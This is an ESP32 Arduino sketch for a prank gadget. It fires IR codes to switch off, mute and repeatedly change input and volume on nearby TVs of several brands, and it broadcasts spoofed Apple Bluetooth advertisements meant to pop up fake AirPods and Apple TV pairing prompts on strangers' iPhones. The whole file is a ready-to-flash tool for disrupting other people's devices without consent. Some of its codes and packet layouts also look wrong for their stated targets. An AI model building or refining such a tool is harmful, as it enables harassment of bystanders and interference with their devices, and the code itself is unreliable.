#include <IRremoteESP8266.h>
#include <IRsend.h>

#include <BLEDevice.h>
#include <BLEAdvertising.h>

// ================== PINS ==================
#define IR_PIN 4

#define BTN_MODE 32
#define BTN_ACT  33

int leds[4] = {25, 26, 27, 14};

// ================== GLOBALS ==================
int mode = 0;
unsigned long lastModePress = 0;

IRsend irsend(IR_PIN);

// ================== SETUP ==================
void setup() {
  irsend.begin();

  pinMode(BTN_MODE, INPUT_PULLUP);
  pinMode(BTN_ACT, INPUT_PULLUP);

  for (int i = 0; i < 4; i++) {
    pinMode(leds[i], OUTPUT);
  }

  updateLEDs();
}

// ================== LOOP ==================
void loop() {

  // MODE BUTTON
  if (digitalRead(BTN_MODE) == LOW && millis() - lastModePress > 300) {
    mode = (mode + 1) % 4;
    updateLEDs();
    lastModePress = millis();
  }

  // ACTIVATE BUTTON
  if (digitalRead(BTN_ACT) == LOW) {
    activateMode();
    delay(500); // anti-spam so you don’t go feral
  }
}

// ================== LED CONTROL ==================
void updateLEDs() {
  for (int i = 0; i < 4; i++) {
    digitalWrite(leds[i], (i == mode) ? HIGH : LOW);
  }
}

// ================== MODE ROUTER ==================
void activateMode() {
  switch (mode) {
    case 0: tvPowerOff(); break;
    case 1: tvMute(); break;
    case 2: applePopupSpam(); break;
    case 3: batteryTroll(); break;
  }
}

// ================== MODE 0: TV POWER OFF ==================
void tvPowerOff() {
  uint64_t codes[] = {
    0x20DF10EF, // LG
    0xE0E040BF, // Samsung
    0xA90,      // Sony
    0x4CB340BF  // Vizio
  };

  for (int i = 0; i < 4; i++) {
    irsend.sendNEC(codes[i], 32);
    delay(120);
  }
}

// ================== MODE 1: TV MUTE ==================
void tvMute() {
  uint64_t codes[] = {
    0x20DF906F,
    0xE0E0F00F,
    0x290,
    0x4CB3F00F
  };

  for (int i = 0; i < 4; i++) {
    irsend.sendNEC(codes[i], 32);
    delay(120);
  }
}

// ================== MODE 2: REAL APPLE POPUP ==================
void applePopupSpam() {

  BLEDevice::init("");
  BLEAdvertising *adv = BLEDevice::getAdvertising();

  BLEAdvertisementData data;

  // ---- AirPods popup ----
  uint8_t airpodsPacket[] = {
    0x4C, 0x00,       // Apple Manufacturer ID
    0x07,             // Nearby Action
    0x19,             // AirPods Pro
    0x01, 0x02, 0x03, 0x04,
    0x05, 0x06
  };

  data.setManufacturerData(
    std::string((char*)airpodsPacket, sizeof(airpodsPacket))
  );
  adv->setAdvertisementData(data);
  adv->start();
  delay(1200);
  adv->stop();

  delay(300);

  // ---- Apple TV popup ----
  uint8_t appleTVPacket[] = {
    0x4C, 0x00,
    0x04,             // Apple TV setup
    0x04,
    0xAA, 0xBB, 0xCC, 0xDD
  };

  data.setManufacturerData(
    std::string((char*)appleTVPacket, sizeof(appleTVPacket))
  );
  adv->setAdvertisementData(data);
  adv->start();
  delay(1200);
  adv->stop();

  BLEDevice::deinit(true);
}

// ================== MODE 3: BATTERY TROLL ==================
void batteryTroll() {
  for (int i = 0; i < 12; i++) {
    irsend.sendNEC(0x20DF40BF, 32); // input
    delay(120);
    irsend.sendNEC(0x20DFC03F, 32); // vol down
    delay(120);
  }
}
